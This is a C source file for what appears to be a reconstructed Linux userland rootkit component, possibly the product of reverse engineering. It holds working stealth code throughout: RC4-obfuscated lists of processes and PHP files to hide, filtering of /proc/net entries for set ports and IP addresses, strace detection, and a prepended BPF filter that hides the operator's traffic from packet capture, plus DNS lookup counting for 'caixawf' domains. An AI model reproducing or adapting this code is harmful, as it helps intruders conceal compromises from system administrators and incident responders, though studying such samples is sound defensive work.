#include <fcntl.h>
#include <linux/filter.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "hide.h"
#include "key.h"
#include "rc4.h"
#include "utils.h"

// processes to hide
const struct enc_str pth[3] = {
  // "apache2start"
  {"\x36\xA6\x9B\x56\xFD\x49\xD5\xC5\xB1\x2E\x54\xE7", 12},
  // "apache2stop"
  {"\x36\xA6\x9B\x56\xFD\x49\xD5\xC5\xB1\x20\x56", 11},
  // "[watchdog/0]"
  {"\x0C\xA1\x9B\x41\xF6\x44\x83\xD9\xA2\x60\x16\xCE", 12}
};

// d? to hide
const struct enc_str dth[2] = {
  // "webfirewallcaixawf"
  {"\x5C\xA1\x9F\x57\xF3\x45\x95\xD3\xB2\x2E\x4A"
   "\xFF\x16\x36\x09\x06\xCE\x54\xF8\xA3\x6E", 21},
  // "caixawf"
  {"\x52\xB5\x9B\x5C\xED\x4D\xE5\xC1\xA3", 9}
};

// files to hide
const struct enc_str fth[9] = {
  // "apache2start"
  {"\x36\xA6\x9B\x56\xFD\x49\xD5\xC5\xB1\x2E\x54\xE7", 12},
  // "apache2stop"
  {"\x36\xA6\x9B\x56\xFD\x49\xD5\xC5\xB1\x20\x56", 11},
  // "profiles.php"
  {"\x27\xA4\x95\x53\xFC\x40\x82\xC5\xEB\x3F\x4E\xE3", 12},
  // "404erro.php"
  {"\x63\xE6\xCE\x50\xE7\x5E\x88\x98\xB5\x27\x56", 11},
  // "mpt86.h"
  {"\x3A\xA6\x8E\x0D\xA3\x02\x8F", 7},
  // "sqlsearch.php"
  {"\x24\xA7\x96\x46\xF0\x4D\x95\xD5\xAD\x61\x56\xFB\x63", 13},
  // "indexq.php"
  {"\x3E\xB8\x9E\x50\xED\x5D\xC9\xC6\xAD\x3F", 10},
  // "mt64.so"
  {"\x3A\xA2\xCC\x01\xBB\x5F\x88", 7},
  // "certbot.h"
  {"\x34\xB3\x88\x41\xF7\x43\x93\x98\xAD", 9}
};

const struct sock_filter filter[] = {
    { 0x0028 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x0000000c /* Ethernet type offset */ },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 18, 0x00000800 },
    { 0x0020 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x0000001a },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 35, 0, 0x0a7b243a },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 34, 0, 0x0a7b089d },
    { 0x0020 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x0000001e },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 32, 0, 0x0a7b243a },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 31, 0, 0x0a7b089d },
    { 0x0030 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000017 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 2, 0, 0x00000084 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 1, 0, 0x00000006 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 28, 0x00000011 },
    { 0x0028 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000014 },
    { 0x0045, 26, 0, 0x00001fff },
    { 0x00b1, 0, 0, 0x0000000e },
    { 0x0048, 0, 0, 0x0000000e },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 22, 0, 0x0000ba07 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 21, 0, 0x0000f449 },
    { 0x0048, 0, 0, 0x00000010 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 19, 18, 0x0000ba07 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 1, 0, 0x00000806 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 6, 0x00008035 },
    { 0x0020 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x0000001c /* Source IP offset */ },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 15, 0, 0x0a7b243a },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 14, 0, 0x0a7b089d },
    { 0x0020 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000026 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 12, 0, 0x0a7b243a },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 11, 12, 0x0a7b089d },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 11, 0x000086dd },
    { 0x0030 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000014 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 2, 0, 0x00000084 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 1, 0, 0x00000006 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 7, 0x00000011 },
    { 0x0028 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000036 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 4, 0, 0x0000ba07 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 3, 0, 0x0000f449 },
    { 0x0028 /* BPF_LD | BPF_W | BPF_ABS */, 0, 0, 0x00000038 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 1, 0, 0x0000ba07 },
    { 0x0015 /* BPF_JMP | BPF_JEQ */, 0, 1, 0x0000f449 },
    { 0x0006 /* BPF_RET */, 0, 0, 0x00000000 },
};

int hidden_ports[3] = {47623, 62537, 0};
int hidden_address[3] = {175842362, 175835293, -1};

// "/proc"
#define PROC_ENC "\x78\xA6\x88\x5A\xF6"

int must_hide(const char *path) {
  char what[16];
  char proc_path[6];
  const char *proc_what;
  int i;

  // "/proc"
  strcpy(proc_path, PROC_ENC);
  if (strstr(path, rc4(key, proc_path, 5)) != path)
    return 0;

  // /proc/what?
  //       ^
  //       |_ &path[6]
  proc_what = &path[6];
  for (i = 0; proc_what[i] != '\0' && proc_what[i] != '/'; i++)
    what[i] = proc_what[i];
  what[i] = '\0';
  return hidden_proc(what) == 0;
}

#define DIGITS_SET_ENC "\x67\xE7\xC8\x06\xA1\x19\xD1\x81\xFD\x76"
#define PROC_S_CMDLINE_ENC "\x78\xA6\x88\x5A\xF6\x03\xC2\xC5\xEA" \
                           "\x2C\x4B\xF7\x7F\x3C\x06\x0A"
#define RH_STRACE_ENC "\x24\xBE\xA6\x4D\xA5\x1C\xCA\xD5\x99\x37" \
                      "\x16\xA3\x60\x21\x1A\x0E\xD5\x50"
#define STRACE0_S_ENC "\x24\xA2\x88\x54\xF6\x49\xBB\xCE\xF5\x7F\x0B\xE0"
#define PROC_S_STAT_ENC "\x78\xA6\x88\x5A\xF6\x03\xC2\xC5\xEA\x3C\x52" \
                        "\xF2\x67\x20\x1B"

int hidden_proc(const char *proc_what) {
  char dst[64];
  char file[256];
  char digits_set[11];
  char proc_s_cmdline[17];
  char rh_strace[19];
  char strace0_s[13];
  char proc_s_stat[16];
  char open_mode[2];
  int fd;
  FILE *f;

  // "0123456789"
  strcpy(digits_set, DIGITS_SET_ENC);
  // if proc_what only contains digits, return 1
  if (strspn(proc_what, rc4(key, digits_set, 10)) != strlen (proc_what))
    return 1;
  // "/proc/%s/cmdline"
  strcpy(proc_s_cmdline, PROC_S_CMDLINE_ENC);
  snprintf(file, 256, rc4(key, proc_s_cmdline, 16), proc_what);
  fd = open(file, 0);
  if (fd != -1) {
    ssize_t read_count = read(fd, file, 256);
    if (read_count > 12) {
      // "rh\x00-c\x00strace"
      strcpy(rh_strace, RH_STRACE_ENC);
      if (memcmp(rc4(key, rh_strace, 18), file, 12) == 0)
        return 0;
      // "strace\x00-s"
      strcpy(strace0_s, STRACE0_S_ENC);
      if (memcmp(rc4(key, strace0_s, 12), file, 9) == 0)
        return 0;
    }
    lseek(fd, 0, SEEK_SET);
    // processes to hide
    for (int i = 0; i < 3; i++) {
      memcpy(dst, pth[i].str, pth[i].len);
      dst[pth[i].len] = '\0';
      rc4(key, dst, pth[i].len);
      if (strstrmem(file, read_count, dst))
        return 0;
    }
    close (fd);
  }
  // "/proc/%s/stat"
  strcpy(proc_s_stat, PROC_S_STAT_ENC);
  snprintf(file, 256, rc4(key, proc_s_stat, 15), proc_what);
  // "r"
  strcpy(open_mode, "\x25");
  f = fopen(file, rc4(key, open_mode, 1));
  if (f) {
    char *lineptr = NULL;
    size_t n = 0;
    size_t read_count = getline(&lineptr, &n, f);

    if (read_count > 7) {
      // remove newline
      if (lineptr[read_count - 1] == '\n')
        lineptr[read_count - 1] = '\0';
      // processes to hide
      for (int i = 0; i < 3; i++) {
        memcpy(dst, pth[i].str, pth[i].len);
        dst[pth[i].len] = '\0';
        rc4(key, dst, pth[i].len);
        //   0123456
        //         |
        //   /proc/what_____.
        //                  |
        if (strcmp(&lineptr[6], dst) == 0) {
          free(lineptr);
          fclose(f);
          return 0;
        }
      }
      free(lineptr);
      fclose(f);
      return 1;
    }
    free(lineptr);
    fclose(f);
  }

  return 1;
}

int hidden_file(const char *filename) {
  char dest[60];

  for (int i = 0; i < ARRAY_SIZE(fth); i++) {
    memcpy(dest, fth[i].str, fth[i].len);
    dest[fth[i].len] = '\0';
    rc4(key, dest, fth[i].len);
    if (strcmp(filename, dest) == 0)
      return 0;
  }

  return 1;
}

extern pcap_handler orig_loop;
int filter_cnt;

void check_pkt(u_char *user, struct pcap_pkthdr *h, u_char *bytes) {
  u_char *data;
  struct pcap_pkthdr *pkt;
  u_char *username;
  char dest[104];
  struct ethhdr *ethernet;
  struct iphdr *ip;
  struct udphdr *udp;
  char *haystack;
  bpf_u_int32 linklayer_size;
  int i;

  username = user;
  pkt = h;
  data = bytes;
  linklayer_size = 42 /* ETHERNET + IPv4 + 8 bytes */;
  // This is prone to buffer overflow. caplen is the adequate
  // variable as it accounts for packet truncation. Oops!
  if (pkt->len >= linklayer_size + 18 /* payload size */) {
    ethernet = (struct ethhdr *)pkt;
    if (ethernet->h_proto == htons(ETH_P_IP)) {
      ip = (struct iphdr *)(bytes + sizeof(struct ethhdr));
      if (ip->protocol == IPPROTO_UDP) {
        udp = (struct udphdr *)(bytes + sizeof(struct ethhdr) +
                                sizeof(struct iphdr));
        if (udp->dest == htons(53 /* DNS */) || udp->source == htons(53)) {
          haystack = (char *)bytes + sizeof(struct ethhdr) + sizeof(struct iphdr)
                                   + sizeof(struct udphdr) + 2 /* transaction ID */;
          for (i = 0; i < ARRAY_SIZE(dth); i++) {
            memcpy(dest, dth[i].str, dth[i].len);
            dest[dth[i].len] = '\0';
            rc4(key, dest, dth[i].len);
            if (strstr(haystack, dest)) {
              filter_cnt++;
              break;
            }
          }
        }
      }
    }
  }

  return orig_loop(user, h, bytes);
}

int apply_filter(int sockfd, int level, int optname,
                 const void *option_value, socklen_t optlen,
                 unsigned int count) {
  struct sock_filter *rules;
  unsigned int _count;
  unsigned int _optlen;
  struct sock_fprog *bpf_filter;
  unsigned int _optname;
  unsigned int _level;
  unsigned int _sockfd;
  struct sock_fprog prog;
  unsigned short offset2; // it seems the compiler optimized this away
  void *dest;

  _sockfd = sockfd;
  _level = level;
  _optname = optname;
  bpf_filter = (struct sock_fprog *)option_value;
  _optlen = optlen;
  _count = count;
  offset2 = count - 1;
  rules = alloca(16 * (sizeof(struct sock_filter) * count + 30) >> 4);
  dest = rules;
  memcpy(dest, &filter, ARRAY_SIZE(filter));
  memcpy((char *)dest + 320, bpf_filter->filter, 8 * bpf_filter->len);
  prog.len = _count;
  prog.filter = dest;
  return syscall(SYS_setsockopt, _sockfd, _level, _optname, &prog, _optlen);
}

FILE *hide_proc_net_connection(FILE *f)
{
  size_t n;
  char address[16];
  char port[8];
  char *lineptr;
  FILE *tmp_f;
  int i;
  int found;

  lineptr = 0LL;
  n = 0LL;
  tmp_f = tmpfile();
  if (!tmp_f)
    return f;

  getline(&lineptr, &n, f);
  fputs(lineptr, tmp_f);
  while (getline(&lineptr, &n, f) != -1) {
    found = 0;
    for (i = 0; hidden_ports[i]; i++) {
      if (strstr(lineptr, gen_proc_net_port(port, hidden_ports[i]))) {
        found = 1;
        break;
      }
    }
    if (!found) {
      for (i = 0; hidden_address[i] != -1; i++) {
        if (strstr(lineptr, gen_proc_net_ip(address, hidden_address[i]))) {
          found = 1;
          break;
        }
      }
      if (!found)
        fputs(lineptr, tmp_f);
    }
  }

  fclose(f);
  free(lineptr);
  fflush(tmp_f);
  fseek(tmp_f, 0LL, 0);
  return tmp_f;
}

const char *const hex_chars = "0123456789ABCDEF";

char *gen_proc_net_port(char *str, int port) {
  str[0] = 58;
  str[1] = hex_chars[port / 4096];
  str[2] = hex_chars[port / 256 % 16];
  str[3] = hex_chars[port / 16 % 16];
  str[4] = hex_chars[port % 16];
  str[5] = 0;
  return str;
}

#define FORMAT_ENC "\x72\xE6\xC8\x6D\xB0\x1C\xD5\xEE\xE0\x7F\x14\xCB\x36\x65\x5A\x37"

char *gen_proc_net_ip(char *str, int address) {
  char byte4;
  char byte3;
  char byte2;
  char byte1;
  int _address;
  char *s;
  char format[17];
  char *byte_helper;

  s = str;
  _address = address;
  byte_helper = (char *)&_address;
  byte4 = byte_helper[3];
  byte3 = byte_helper[2];
  byte2 = byte_helper[1];
  byte1 = (uint8_t)address;
  // "%02X%02X%02X%02X"
  strcpy(format, FORMAT_ENC);
  snprintf(s, 10, rc4(key, format, 16), byte1, byte2, byte3, byte4);
  return s;
}
